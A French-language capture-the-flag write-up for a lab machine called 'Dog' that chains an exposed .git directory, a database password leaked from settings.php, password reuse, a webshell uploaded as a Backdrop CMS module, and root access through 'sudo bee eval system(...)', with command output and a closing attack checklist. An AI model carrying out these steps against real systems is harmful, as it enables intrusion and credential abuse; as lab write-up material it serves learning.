---
title: Dog
date: '2025-06-28'
tags: ['sudo exploit', 'git directory leakage', 'RCE']
draft: false
summary: 'Ce dÃ©fi exploite des failles dans un CMS exposÃ© (Backdrop CMS) et une escalade de privilÃ¨ges via un binaire mal configurÃ© (sudo bee).'
images: ['/static/images/dog/logo.webp']
---

<div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2rem' }}>
  <img
    src="/static/images/dog/logo.webp"
    alt="dog_logo"
    style={{ width: '200px', height: '200px' }}
  />
</div>

# ğŸ§  Types de vulnÃ©rabilitÃ©s exploitÃ©es

1. **.git directory leakage** : exposition publique du rÃ©pertoire .git accessible via HTTP.
2. **Informations sensibles** exposÃ©es dans un fichier de configuration (settings.php).
3. **RCE** (Remote Code Execution) dans Backdrop CMS via upload de module malveillant.
4. **Escalade de privilÃ¨ges** via un binaire sudo mal configurÃ©.

# ğŸ§­ MÃ©thodologie Ã©tape par Ã©tape

## ğŸ” 1. Scan initial & reconnaissance

â€¢ Scan des ports â†’ ports 22 (SSH) et 80 (HTTP) sont ouverts.

```
$ nmap -sC -sV 10.10.11.58
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 12:07 CEST
Nmap scan report for dog.htb (10.10.11.58)
Host is up (0.34s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git:
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
1234/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.85 seconds
```

## ğŸ—‚ 2. Recherche de chemins sensibles

â—‡ Fuzz avec dirsearch â†’ **/ .git/ accessible**

```
$ dirsearch -u http://10.10.11.58 -x 404,500
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/nnbb/reports/http_10.10.11.58/_25-06-28_20-21-21.txt

Target: http://10.10.11.58/

[20:21:21] Starting:
[20:21:38] 301 -  309B  - /.git  ->  http://10.10.11.58/.git/
[20:21:38] 200 -  409B  - /.git/branches/
[20:21:38] 200 -   73B  - /.git/description
[20:21:38] 200 -   95B  - /.git/COMMIT_EDITMSG
[20:21:38] 200 -  604B  - /.git/
[20:21:38] 200 -   23B  - /.git/HEAD
[20:21:38] 200 -   92B  - /.git/config
[20:21:38] 200 -  455B  - /.git/info/
[20:21:38] 200 -  240B  - /.git/info/exclude
[20:21:39] 200 -  476B  - /.git/logs/
[20:21:39] 200 -  650B  - /.git/hooks/
[20:21:39] 301 -  319B  - /.git/logs/refs  ->  http://10.10.11.58/.git/logs/refs/
[20:21:39] 200 -  230B  - /.git/logs/HEAD
[20:21:39] 301 -  320B  - /.git/refs/heads  ->  http://10.10.11.58/.git/refs/heads/
[20:21:39] 301 -  319B  - /.git/refs/tags  ->  http://10.10.11.58/.git/refs/tags/
[20:21:39] 301 -  325B  - /.git/logs/refs/heads  ->  http://10.10.11.58/.git/logs/refs/heads/
[20:21:39] 200 -   41B  - /.git/refs/heads/master
[20:21:39] 200 -  230B  - /.git/logs/refs/heads/master
[20:21:39] 200 -  461B  - /.git/refs/
[20:21:43] 200 -  337KB - /.git/index
[20:21:43] 200 -    2KB - /.git/objects/
[20:21:44] 403 -  276B  - /.htaccess.bak1
[20:21:44] 403 -  276B  - /.ht_wsr.txt
[20:21:45] 403 -  276B  - /.htaccess.orig
[20:21:45] 403 -  276B  - /.htaccess.save
[20:21:45] 403 -  276B  - /.htaccess.sample
[20:21:45] 403 -  276B  - /.htaccess_extra
[20:21:45] 403 -  276B  - /.htaccessOLD
[20:21:45] 403 -  276B  - /.htaccess_orig
[20:21:45] 403 -  276B  - /.htaccessBAK
[20:21:45] 403 -  276B  - /.htaccess_sc
[20:21:45] 403 -  276B  - /.htaccessOLD2
[20:21:45] 403 -  276B  - /.htm
[20:21:45] 403 -  276B  - /.httr-oauth
[20:21:45] 403 -  276B  - /.htpasswd_test
[20:21:45] 403 -  276B  - /.html
[20:21:45] 403 -  276B  - /.htpasswds
[20:21:51] 403 -  276B  - /.php
[20:23:00] 301 -  309B  - /core  ->  http://10.10.11.58/core/
[20:23:16] 301 -  310B  - /files  ->  http://10.10.11.58/files/
[20:23:16] 200 -  586B  - /files/
[20:23:37] 200 -  456B  - /layouts/
[20:23:39] 200 -    7KB - /LICENSE.txt
[20:23:51] 301 -  312B  - /modules  ->  http://10.10.11.58/modules/
[20:23:52] 200 -  399B  - /modules/
[20:24:17] 200 -    5KB - /README.md
[20:24:20] 200 -  528B  - /robots.txt
[20:24:22] 403 -  276B  - /server-status
[20:24:22] 403 -  276B  - /server-status/
[20:24:23] 200 -    0B  - /settings.php
[20:24:29] 301 -  310B  - /sites  ->  http://10.10.11.58/sites/
[20:24:40] 301 -  311B  - /themes  ->  http://10.10.11.58/themes/
[20:24:40] 200 -  454B  - /themes/
```

## ğŸ§‘â€ğŸ’» 3. Exfiltration du dÃ©pÃ´t Git

â—‡ Utilisation de **GitHack** pour extraire le contenu

```
python3 ../GitHack/GitHack.py http://10.10.11.58/.git/
```

```
$ ls 10.10.11.58
core   index.php  LICENSE.txt  robots.txt    sites
files  layouts    README.md    settings.php  themes
```

â—‡ Explore **settings.php** pour trouver les identifiants de la base de donnÃ©es (et potentiellement un mot de passe rÃ©utilisÃ©).

```
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

â—‡ DÃ©couverte dans **settings.php** du mot de passe utilisÃ© pour l'accÃ¨s Ã  la base de donnÃ©es :

```
BackDropJ2024DS2024
```

## ğŸ” 4. Tentative de connexion CMS

![login](/static/images/dog/login.png)
â—‡ **Recherche d'adresses e-mail** pour pouvoir se connecter â†’ **tiffany@dog.htb** trouvÃ©e

```
grep -E -i -r '[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' .

./README.md:[security@backdropcms.org](mailto:security@backdropcms.org).
./README.md:  desktop and mobile browsers. *(Contact info@backdropcms.org for access
./README.md:  for development. *(Contact info@backdropcms.org for a license.)*
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

â—‡ Tente de se connecter avec tiffany@dog.htb â†’ **connexion rÃ©ussie** avec BackDropJ2024DS2024

## ğŸ’¥ 5. Exploitation RCE

â—‡ **VÃ©rifie les vulnÃ©rabilitÃ©s** connues sur Backdrop CMS -> TÃ©lÃ©charge un exploit Backdrop CMS (**Exploit-DB #52021**).

![exploit](/static/images/dog/exploit_rce.png)

Lâ€™exploit abuse de la fonctionnalitÃ© dâ€™installation de modules personnalisÃ©s dans lâ€™interface admin de Backdrop CMS :

- **crÃ©e un faux module** contenant un fichier shell.info (descripteur de module valide) + un fichier shell.php (webshell PHP avec champ cmd).
- compresse le tout dans une archive shell.zip.

â—‡ Execute le script Python (python3 52021.py http://10.10.11.58) et gÃ©nÃ¨re un fichier shell.zip, non acceptÃ© par Backdrop.

â—‡ Solution : recrÃ©er un .tar propre Ã  partir du dossier gÃ©nÃ©rÃ©.

```
tar -cf shell.tar shell/
```

```
$ ls
52021.py  output_dir_git  shell  shell.tar  shell.zip
```

â—‡ Se connecte Ã  lâ€™interface admin et tÃ©lÃ©verse le module via /admin/modules/install.

![chemin](/static/images/dog/chemin_upload.png)

â—‡ Upload sur /admin/modules/install.

![upload](/static/images/dog/upload.png)
![succes](/static/images/dog/succes.png)

â—‡ AccÃ¨de Ã  la webshell via :

```
http://10.10.11.58/modules/shell/shell.php?cmd=whoami
```

â—‡ Tape la commande :
![commande](/static/images/dog/commande.png)

â—‡ RÃ©cupÃ¨re la liste des utilisateurs -> **johncusack**
![passwd](/static/images/dog/passwd.png)

## ğŸ”‘ 6. AccÃ¨s utilisateur via SSH

â—‡ Teste lâ€™accÃ¨s SSH avec johncusack:BackDropJ2024DS2024 -> **fonctionne**

```
ssh johncusack@10.10.11.58
```

â—‡ âœ… RÃ©cupÃ©ration du flag **user.txt**

```
johncusack@dog:~$ ls
user.txt
```

## ğŸš€ 7. Escalade de privilÃ¨ges

â—‡ **VÃ©rifie les droits sudo :**

```
johncusack@dog:~$ sudo -l
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

â—‡ RÃ©sultat : peut exÃ©cuter /usr/local/bin/bee en tant que **root**.

â—‡ **bee** est l'utilitaire en ligne de commande pour BackDrop CMS et a besoin de connaÃ®tre lâ€™endroit prÃ©cis oÃ¹ Backdrop CMS est installÃ© pour fonctionner correctement.

```
johncusack@dog:~$ bee -help
ğŸ Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

...
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

```

- "eval" -> argument qui demande Ã  bee d'Ã©valuer ce qui suit.
- "--root" -> option qui sert Ã  spÃ©cifier le rÃ©pertoire racine du CMS (lÃ  oÃ¹ Backdrop est installÃ©). -> **/var/www/html**

â—‡ bee permet dâ€™exÃ©cuter du code PHP â†’ donc **exÃ©cuter des commandes systÃ¨me**.

"system('id')" : Code PHP injectÃ© pour exÃ©cuter la commande systÃ¨me id, qui affiche l'identitÃ© de l'utilisateur courant du systÃ¨me.

```
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('id')"
uid=0(root) gid=0(root) groups=0(root)
```

```
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('ls /root/')"
root.txt
```

â—‡ âœ… RÃ©cupÃ©ration du **flag root.txt**

---

# âœ… Checklist rÃ©utilisable pour d'autres labs similaires

1. ğŸ” Scanner les ports et identifier technologies web

2. ğŸ—‚ Fuzzer Ã  la recherche de .git, .env, admin/, etc.

3. ğŸ“¦ Extraire les dÃ©pÃ´ts .git avec GitHack ou GitTools

4. ğŸ” Trouver des identifiants ou mots de passe dans les fichiers de config

5. ğŸ‘¤ Tenter une connexion CMS ou SSH avec ces infos

6. ğŸ§  Identifier la version du CMS et rechercher un exploit adaptÃ©

7. ğŸ“¤ Envoyer un payload (webshell, reverse shell) via un module ou formulaire vulnÃ©rable

8. ğŸ§‘â€ğŸ’» Escalader les privilÃ¨ges via sudo, SUID ou cron jobs mal configurÃ©s
